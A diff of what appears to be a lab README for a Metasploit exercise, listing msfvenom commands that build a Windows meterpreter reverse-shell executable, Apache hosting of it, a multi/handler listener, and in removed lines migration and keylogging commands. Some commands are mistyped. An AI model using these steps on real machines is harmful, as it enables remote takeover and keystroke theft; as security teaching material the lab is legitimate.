@@ -62,67 +62,51 @@ msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload
 Find the attackers ip address using ifconfig
 
 ### Output:
+<img width="822" height="338" alt="image" src="https://github.com/user-attachments/assets/cb3fe711-abe6-489a-a7c9-3d1a8df04830" />
 
-<img width="732" height="498" alt="image" src="https://github.com/user-attachments/assets/f0b21e63-c196-4f8c-9cf4-c57bf565aa07" />
 
 
-Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > nikhil.exe```
+Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```
 
 ### Output:
 
-<img width="917" height="244" alt="image" src="https://github.com/user-attachments/assets/e0c1c121-7bf8-4db7-9636-c464a5893f83" />
+<img width="960" height="146" alt="image" src="https://github.com/user-attachments/assets/38b403c2-2d9e-409a-bc52-d3bdeb5e7b95" />
 
 
+copy the fun.exe into the apache ```/var/www/html ```folder
 
-copy the nikhil.exe into the apache ```/var/www/html ```folder
-
-<img width="409" height="122" alt="image" src="https://github.com/user-attachments/assets/bf91f50e-ed72-49ce-91b6-68b8f9751ae4" />
-<img width="311" height="65" alt="image" src="https://github.com/user-attachments/assets/b72bc5ed-aefc-4229-be0e-8990f59cb038" />
-
+<img width="447" height="91" alt="image" src="https://github.com/user-attachments/assets/27635df4-f2c4-46b4-87dc-4fa68c091868" />
 
 
 Start apache server ```sudo systemctl apache2 start``` 
+
+
+<img width="819" height="217" alt="image" src="https://github.com/user-attachments/assets/907eda9d-f52d-49a9-9182-0fc21b94eed3" />
+
 Check the status of apache2 ```sudo apache2 status```
-
-<img width="809" height="385" alt="Screenshot 2025-09-29 083722" src="https://github.com/user-attachments/assets/b193bd17-d388-4ea2-885d-1338913f62b7" />
-
+<img width="1129" height="705" alt="image" src="https://github.com/user-attachments/assets/d218edd3-92db-4a25-ba22-1373739560eb" />
 
 
 Invoke msfconsole:
-
-<img width="642" height="648" alt="image" src="https://github.com/user-attachments/assets/24e92ff8-eda2-412d-a045-365ee9e44697" />
-
+<img width="1193" height="874" alt="image" src="https://github.com/user-attachments/assets/eb898d0d-9c03-4ff5-b763-481988581345" />
 
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
-
-<img width="754" height="497" alt="image" src="https://github.com/user-attachments/assets/72c1356d-0d76-4d8d-9517-313e78b7f361" />
-
 
 Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```
 
 ### Output 
-<img width="539" height="107" alt="image" src="https://github.com/user-attachments/assets/b4004be8-5d93-4140-b3d8-3d208811e2c5" />
+<img width="870" height="221" alt="image" src="https://github.com/user-attachments/assets/8af165cd-c95b-4ecf-9297-a95c4ad646f6" />
+
 
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
+
+
 
 Bypass any warning boxes, double-click the file, and allow it to run.
 On kali give the command exploit
 
 
-
-To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
-
-The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:
-
-migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
-
-#### Post Exploitation:
-The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
-
-
-
-keyscan_dump Shows the keystrokes captured so far
 
 
 
